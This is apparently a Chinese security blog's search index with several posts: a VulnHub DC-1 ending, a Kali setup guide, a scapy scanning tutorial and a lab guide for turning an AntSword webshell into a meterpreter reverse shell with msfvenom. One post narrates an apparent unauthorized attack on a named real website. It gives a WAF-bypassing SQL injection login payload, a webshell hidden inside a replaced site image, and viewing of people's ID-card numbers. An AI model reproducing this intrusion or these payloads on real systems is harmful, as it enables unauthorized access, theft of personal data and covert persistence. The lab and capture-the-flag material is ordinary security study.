这里另外的一个解决办法就是直接执行一个shell终端，比如/bin/bash，/bin/sh。 执行后会得到一个root权限的shell，直接切换到/root目录，查看thefinalflag.txt文件。 这里还有一个问题，如果执行/bin/bash返回的shell并不是root权限，提权没有成功。希望大佬能够指点指点。 总结拿到靶机后，首先需要获取靶机的ip，然后可以探测网站开放的端口或者访问网站查看web服务。先去看web服务有没有什么漏洞，比如登录注册入口是否存在SQL注入，弱口令，万能密码，验证码可复用，用户锁定等，前台上传头像处是否可以上传图片马，同时也可以查看网站服务器版本和使用的脚本语言以及CMS版本信息等，如果没地方入手就扫一下网站目录，或者查看网页源码，看是否有一些特殊或奇怪的路径，然后去网上（Shodan、fafo）查找有没有项目源码，如果有的话就下载到本地直接审计，找漏洞。当然也可以从网站服务入手，根据端口扫描的结果可以得到网站开放的服务，可以去网上找相关版本的服务漏洞，然后就是Poc验证，exploit利用。信息收集的目的是尽可能多地了解网站，不断发掘漏洞和利用点，然后再一个一个去验证。找到漏洞或利用点后，就要想办法获得一个shell，哪怕是低权限的shell；如果能够进入后台就找上传点，上传木马然后用蚁剑连接getshell。像SQL注入这类漏洞可以自己写自动化利用脚本，像CVE这些弄懂原理之后可以直接上Metasploit框架，当然感兴趣的话可以自己复现一遍。拿到shell后，如果权限比较低的话就要想办法提权，先看看post/multi/recon/local_exploit_suggester模块有没有可以直接利用的本地提权漏洞，如果没有的话就得想其他办法了，提权这块我不太会，所以就不献丑了，直接献上大佬的文章：https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g 。 看了大佬的文章，发现自己水平还是很菜，得多向大佬多学习，我发现学得越多就觉得自己要学的东西越多。如果你是大佬，带带弟弟，哈哈哈哈哈~ 参考文章https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/ https://blog.csdn.net/weixin_41598660/article/details/104442503 https://www.jianshu.com/p/c6802c4f03e2 https://blog.csdn.net/Dzq_Boyka/article/details/80338889 https://www.isfirst.net/drupal/drupal-reset-password https://blog.csdn.net/weixin_43803070/article/details/94759234 https://blog.csdn.net/gramdog/article/details/80374119 https://www.jianshu.com/p/4ea1e6aa2aa7 https://blog.csdn.net/weixin_44912169/article/details/105845909 https://linux.cn/article-10549-1.html?pr","link":"/VulnHub-DC-1/"},{"title":"端口转发","text":"","link":"/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"title":"第一次日站~","text":"​ 小白第一次X站，没有什么技术含量，大佬们轻点打！ 0x1 前言Google搜索拿到网站后台： 0x2 后台登陆进入后台页面需要先绕过登陆。首先尝试跨目录访问，看看能不能越权访问admin目录（我之前有一次就是直接删减url访问admin目录进入后台的），额，设置了权限，禁止访问。接着就是弱口令一把梭，发现还是绕不过去。然后就是万能密码，这里我是用万能密码绕过的。 直接输入用户名：admin’ #，密码随便输，但必须要大于两个字符，否则会报错；输入完成之后会报错，并且直接爆出SQL查询语句； 发现这里的#并没有起到注释的作用，根据sql语句重新构造：admin’ or ‘1’=’1，这样sql语句就变成：select ID,name,pass from admin where name=’admin’ or ‘1’=’1’ And pass=’65DED5353C5EE48D0B7D48C591B8F430’ ，提示包含非法字符，应该是有WAF，检测到or关键字； (⊙﹏⊙)额，没啥思路了，去看了一下网站的服务器，发现是windows的IIS服务器； 想到了windows系统%00截断的特性。用burpsuite抓包，在or后面加上%00，发现后面的’1’=’1没有了，说明存在00截断。重新构造payload：uName=admin%27+or’%00+%271%27%3D%271&amp;uPass=123，构造后查询语句变成：select ID,name,pass from admin where name=’admin’ or ‘’ And pass=’65DED5353C5EE48D0B7D48C591B8F430’，这样就可以绕过后面的密码验证，同时还能绕过WAF的检测，WAF一般都是正则匹配关键字；然后重新发包，发现页面发生变化，不提示sql语句错误和非法字符，应该是进入后台了。 将payload复制到抓取的数据包中，然后forward，打开浏览器查看，发现已经进入后台。 拿下后台后，看看有没有可利用的信息。 密码修改： 发现在系统管理模块可以直接修改管理员密码，而且不需要验证旧密码，直接输入新密码即可修改。而且还可以添加管理员用户。 查看敏感信息： 在围棋棋手管理管理模块，可以查看棋手的身份证号码。 0x3 文件上传在广告管理模块中可以修改广告图片，并且可以自己上传本地图片。 这里首先尝试上传一个asp的一句话木马，发现.asp后缀的文件被禁了，测试了一下，上传a.b文件，发现还是提示错误，说明是白名单； 本来是想用抓包然后用%00截断试一试的，但发现抓不到包，害，可能是自己太菜了。然后我换了另外一种思路，就是先上传shell.jpg，然后再将文件重命名为shell.asp，但是发现文件扩展名不能修改成asp，这里也是白名单。 没思路了，希望大佬能够指点指点（膜拜大佬）。 这里是可以上传图片马的。 制做asp图片马： 思路是将网站上原本存在的图片下载到本地，制作成图片马，然后再上传到网站上替换掉原来的图片，这样不容易被发现（手动滑稽），这里我替换的是a(1).jpg。查看替换后的图片，可以正常显示，将图片下载到本地，用Notepad++打开，可以看到一句话木马，图片马上传成功。 如果后续有文件包含的话就可以利用。 0x3 IIS6.0网站使用的是 IIS6.0 的服务器，搜索发现IIS6.0主要有两个漏洞点： IIS6.0 WebDav远程命令执行漏洞 IIS6.x解析漏洞 IIS6.0 WebDav远程命令执行漏洞 原理及利用方法： https://thief.one/2017/03/29/IIS6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-7269/ 这里需要注意上面的师傅提供的exp结尾少了一个end，建议去官网找： https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2 这个漏洞的利用条件需要服务器开启了WebDav； 判断网站是否开启WebDav：https://blog.csdn.net/na_tion/article/details/53020936 网站开启了WebDAV，美滋滋。 获取网站IP：https://ping.chinaz.com/http://www.ntwq.cn/ ，没有开CDN，直接可以看到IP； 这里没有利于成功，可能网站已经打了补丁~ IIS6.x解析漏洞 漏洞原理：基于文件名；该版本默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是服务器默认不解析; 号及其后面的内容，相当于截断。 这里尝试上传木马，结果发现网站会将 . 号和 ; 号替换为 _ (下划线)。 这里尝试修改文件名也没有成功。 0x4 WebDAV WebDAV是一组基于超文本传输协议的技术集合，有利于用户间协同编辑和管理存储在万维网服务器文档。通俗一点儿来说，WebDAV就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。 在0x3中发现网站开启了WebDAV，WebDAV可以上传文件（PUT）或者修改文件名（MOVE）。、 利用方法： https://blog.csdn.net/na_tion/article/details/53020936 https://blog.csdn.net/yumiweitaozi/article/details/105229336 尝试上传文件 txt或其他类型的文件提示没有权限，asp，aspx则直接404；网站应该是有防护软件。 尝试修改文件名 之前上传的木马文件被改成 1_asp_.jpg ，尝试用MOVE和COPY修改文件名；需要用到工具：IISPutScanner； 这里不允许MOVE，但是可以COPY； 一直提示错误。。。 0x5 CKeditor + CKFinder网站使用的是CKeditor编辑器。 扫描目录，逐个访问，没有发现什么有价值的信息，因为很多目录和文件都禁止访问。 上网查找CKeditor编辑器的漏洞，发现有asp目录和asp文件： https://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/ 思路是上传文件到asp目录或者写入木马到asp文件。 同时还发现另外一个文件夹Files，尝试上传文件，但还是白名单，可以上传txt文件，图片文件。 CKeditor编辑器可以通过抓包修改参数来创建文件夹：https://blog.csdn.net/u011781521/article/details/59057759 但是还是没法创建，可能是因为没有权限； 0x6 XSS网站是存在XSS漏洞的，而且没有进行任何防护。 0x7 总结虽然这次没有拿到shell，但还是学到了不少东西。","link":"/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%97%A5%E7%AB%99/"},{"title":"kali安装","text":"​ 1.创建虚拟机； 2.选择典型；下一步； 3.选择安装程序光盘映像文件（kali官网下载的kali-Linux iOS镜像文件）；下一步； 4.选择Debian版本的aLinux系统；下一步； 5.自定义虚拟机名称和安装位置；下一步； 6.最大磁盘大小默认，将虚拟磁盘存储为单个文件；下一步； 7.完成； 8.开启此虚拟机； 9.选择图形化安装； 10.选择中文；继续； 11.选择中国；汉语； 12.主机名直接默认kali； 13.跳过，直接继续； 14.设置密码，跟window开机密码类似； 15.使用整个磁盘； 16.将所有文件放在同一个分区中； 17.结束分区设定并将修改写入磁盘； 19.安装系统需要些时间，耐心等待； 20.不使用网络镜像； 21.完成安装，点继续启动； 22.用户名默认为root，密码为先前设置的密码（第14步）； 打开kali之后出现乱码，这是由于最新版的kali默认不安装中文字体，所以中文会出现乱码；下面需要安装中文字体。 安装中文字体解决乱码1.打开终端； 2.输入安装命令： 1sudo apt-get install ttf-wqy-zenhei 出现这种结果说明是安装出现错误； 解决办法： 输入命令，编辑文件： 1vi /etc/apt/sources.list 按 i 进入编辑模式，写入官方源或国内源，这里我写的是阿里云的源；这里因为没有安装vmtools，所以只能手动输入； 12345678910111213kali官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib随便挑一个写进去（国内源会稍微快一点） 修改完成后按 Esc 退出编辑模式；然后输入 Shift + :wq 保存并退出； 然后输入命令： 1apt update 最后安装中文字体； 1sudo apt-get install ttf-wqy-zenhei 安装成功。 设置中文字体 1.重新配置安装的软件包，输入命令： 1dpkg-reconfigure locales 2.选择字符编码，按空格选中，按 Tab 键切换选项； 选中 en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8；然后按 Tab 键选择 OK（左边一个）后回车； 3.选择字符； 选择 zh_CN.UTF-8；然后按 Tab 键选择 OK 后回车； 最后输入命令reboot回车，重启即可。 安装谷歌中文输入法 基于fcitx输入法框架安装谷歌输入法。 打开终端输入如下命令： 123apt-get install fcitxapt-get install fcitx-googlepinyinreboot #重启 更换输入法；输入命令： 1im-config 将输入法由默认改为fcitx； Ctrl + 空格 可以切换中英文。 安装VMware Tools 安装VMware Tools后可以实现从物理机拖文件到虚拟机，屏幕自动铺满，粘贴复制，鼠标在物理机和虚拟机之间自由切换等等。 1.在虚拟机选项中点击安装VMware Tools； 弹出提示，直接叉掉即可； 2.然后桌面上会出现VMware Tools，右键点击选择挂载卷；然后双击打开； 3.将压缩文件拖到桌面上； 4.然后弹出卷； 5.解压文件，打开终端，切换到桌面文件夹，输入命令（tab键可以自动补全文件名）： 1tar zxvf VMwareTools-10.3.10-13959562.tar.gz 可以看到解压后桌面上多了一个文件夹； 6.切换到vmware-tools-distrib文件夹，运行文件vmware-install.pl； 根据提示选择回车，yes或no； 删除对应的压缩文件和文件夹； 最后reboot重启。","link":"/kali%E5%AE%89%E8%A3%85/"},{"title":"实战1-使用scapy定制数据包进行高级扫描","text":"​ Scapy 是一个可以让用户发送、侦听和解析并伪装网络报文的 Python 程序，这些功能可以用于制作侦测、扫描和攻击网络的工具。 kali主机：192.168.43.52 Metasploit主机：192.168.43.41 scapy定制ARP协议使用ARP().display()来查看ARP函数的作用： 12345678910111213&gt;&gt;&gt; ARP().display()###[ ARP ]### hwtype= 0x1 硬件类型 ptype= IPv4 协议类型 hwlen= None 硬件地址长度（MAC） plen= None 协议地址长度（IP） op= who-has who-has查询 hwsrc= 00:0c:29:1f:53:0c 源MAC地址 psrc= 192.168.43.52 源IP地址 hwdst= 00:00:00:00:00:00 目的端的MAC地址 pdst= 0.0.0.0 目标IP&gt;&gt;&gt; 向Metasploit主机发送arp请求： 12345678//sr1函数的功能是发送和接收数据包&gt;&gt;&gt; sr1(ARP(pdst=\"192.168.43.41\"))Begin emission:Finished sending 1 packets.*Received 1 packets, got 1 answers, remaining 0 packets&lt;ARP hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=00:0c:29:64:11:56 psrc=192.168.43.41 hwdst=00:0c:29:1f:53:0c pdst=192.168.43.52 |&lt;Padding load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |&gt;&gt; //psrc=192.168.43.41说明Metasploit主机已经接收到我们发送的数据包并返回应答包 &gt;&gt;&gt; scapy定制Ping包IP()生成ping包的源IP和目标IP，ICMP()生成ping包的类型。 使用IP().display()和ICMP().display()查看IP函数和ICMP函数的作用： 12345678910111213141516171819202122232425&gt;&gt;&gt; IP().display()###[ IP ]### version= 4 ihl= None tos= 0x0 len= None id= 1 flags= frag= 0 ttl= 64 proto= hopopt chksum= None src= 127.0.0.1 源地址 dst= 127.0.0.1 目标地址 \\options\\&gt;&gt;&gt; ICMP().display()###[ ICMP ]### type= echo-request ping包的类型 code= 0 chksum= None id= 0x0 seq= 0x0&gt;&gt;&gt; 修改IP包的dst（目的地址）； 拼接上ICMP的数据包类型； 使用sr1()发送数据包和接收数据包 。 12&lt;IP version=4 ihl=5 tos=0x0 len=28 id=45402 flags= frag=0 ttl=64 proto=icmp chksum=0xf1d8 src=192.168.43.41 dst=192.168.43.52 |&lt;ICMP type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |&lt;Padding load='\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' |&gt;&gt;&gt;&gt;&gt;&gt; scapy定制TCP协议SYN请求查看TCP函数的用法： 123456789101112131415&gt;&gt;&gt; TCP().display()###[ TCP ]### sport= ftp_data dport= http seq= 0 ack= 0 dataofs= None reserved= 0 flags= S window= 8192 chksum= None urgptr= 0 options= []&gt;&gt;&gt; 发送SYN数据包： 12sr1(IP(dst=\"192.168.43.41\")/TCP(flags=\"S\",dport=80),timeout=1)//flags=\"S\"表示SYN数据包，dport=80表示目标端口为80 我们收到一个flags=SA的数据包。SA标志表示SYN+ACK，我们收到服务器tcp三次插手中的第二个包，能收到回应，表示80端口开放。 注：这种基于tcp的半连接扫描，更隐密，更不容易被发现。","link":"/%E5%AE%9E%E6%88%981-%E4%BD%BF%E7%94%A8scapy%E5%AE%9A%E5%88%B6%E6%95%B0%E6%8D%AE%E5%8C%85%E8%BF%9B%E8%A1%8C%E9%AB%98%E7%BA%A7%E6%89%AB%E6%8F%8F/"},{"title":"蚁剑shell转到meterpreter_shell","text":"​ 0x1 前言 在渗透测试的过程中，如果使用蚁剑或菜刀连接上目标主机后，能够得到一个shell，但是我们并不能使用kali里面的meterpreter工具进行后渗透攻击，所以需要将蚁剑的shell迁移到meterpreter中。 环境准备： kali：192.168.43.52 Metasploitable2：192.168.43.41 0x2 蚁剑shell这里首先需要使用蚁剑连接上目标主机。 使用nmap扫描Metasploitable2主机开放的端口后，发现80端口，用浏览器访问，然后打开DVWA，用户名和密码分别是admin/password，进去后先将难度调到 low 级别，然后找到文件上传模块上传一句话木马，最后使用蚁剑连接，拿到shell。 0x3 meterpreter shell在拿到蚁剑的shell之后，不能使用Metasploit框架来进行后渗透工作，所以需要将shell迁移到kali中。 思路：用msfvenom工具来生成一个木马文件，然后将木马上传到目标主机上并执行，反弹一个meterpreter shell。 信息收集： 使用msfvenom工具生成木马时需要知道目标主机的相关版本信息。 查看目标主机的内核版本和发行版本： i686是属于x86系列。 生成木马： 根据目标主机的信息查找payload： 1msfvenom -l payloads | grep linux | grep x86 这里我们选择linux/x86/meterpreter/reverse_tcp这个payload，因为我们需要目标主机反弹回一个meterpreter shell。使用msfvenom生成木马： 12msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.52 LPORT=4444 -f elf &gt; shell.elf// LHOST和LPORT是设置木马程序要连接的ip和端口，-f是设置文件格式（elf表示为linux下的可执行文件） 上传木马： 将木马文件通过蚁剑上传到目标主机的tmp目录，因为tmp目录中的文件一般都是可执行的，我这里是先将shell.elf拖到本机，然后再拖到蚁剑里面的，直接从kali虚拟机拖到蚁剑可能会报错； 修改文件权限为可执行： 开启监听： 在kali中开启msf的监听模块，等待目标主机连接； exploit/multi/handler模块： 这个模块是一个通用模块，它可以根据你设置的payload来进行漏洞利用。比如我们在这里设置了反弹shell的payload，那么它就会在kali上开启监听，等待目标主机运行木马程序进行连接。 getshell： 直接在蚁剑的shell上运行木马文件，kali主机这边就会拿到一个meterpreter shell。 0x4 总结在拿到蚁剑的shell后，不方便进行后续的渗透工作，所以需要想办法将shell反弹到kali主机上。这里是利用木马程序来反弹shell。 参考文章： https://www.youtube.com/watch?v=TCkniccL_QU https://www.cnblogs.com/bmjoker/p/10051014.html https://paper.seebug.org/29/","link":"/%E8%9A%81%E5%89%91shell%E8%BD%AC%E5%88%B0meterpreter-shell/"}],"tags":[{"name":"LAMP","slug":"LAMP","link":"/tags/LAMP/"},{"name":"提权","slug":"提权","link":"/tags/%E6%8F%90%E6%9D%83/"},{"name":"waf","slug":"waf","link":"/tags/waf/"},{"name":"netcat","slug":"netcat","link":"/tags/netcat/"},{"name":"VulnHub","slug":"VulnHub","link":"/tags/VulnHub/"},{"name":"kali安装","slug":"kali安装","link":"/tags/kali%E5%AE%89%E8%A3%85/"},{"name":"scapy","slug":"scapy","link":"/tags/scapy/"},{"name":"msfvenom","slug":"msfvenom","link":"/tags/msfvenom/"},{"name":"蚁剑","slug":"蚁剑","link":"/tags/%E8%9A%81%E5%89%91/"},{"name":"msfconsole","slug":"msfconsole","link":"/tags/msfconsole/"}],"categories":[{"name":"网站","slug":"网站","link":"/categories/%E7%BD%91%E7%AB%99/"},{"name":"渗透测试","slug":"渗透测试","link":"/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"工具","slug":"工具","link":"/categories/%E5%B7%A5%E5%85%B7/"},{"name":"kali","slug":"kali","link":"/categories/kali/"}]}